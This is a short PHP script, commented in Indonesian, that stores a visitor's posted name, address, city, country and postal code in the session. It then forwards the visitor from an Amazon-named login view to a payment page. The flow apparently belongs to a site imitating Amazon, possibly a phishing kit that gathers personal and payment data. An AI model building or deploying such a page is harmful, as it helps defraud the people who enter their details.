<?php
session_start();
require_once '../function.php';

if (!isset($_SESSION['email'])) {
    header('Location: ../views/amazon.html');
    exit;
}

$_SESSION['nama'] = trim($_POST['nama'] ?? '');
$_SESSION['alamat'] = trim($_POST['alamat'] ?? '');
$_SESSION['kota'] = trim($_POST['kota'] ?? '');
$_SESSION['negara'] = trim($_POST['negara'] ?? '');
$_SESSION['kode_pos'] = trim($_POST['kode_pos'] ?? '');

// Lanjut ke pembayaran
header('Location: ../views/payment.html');
exit;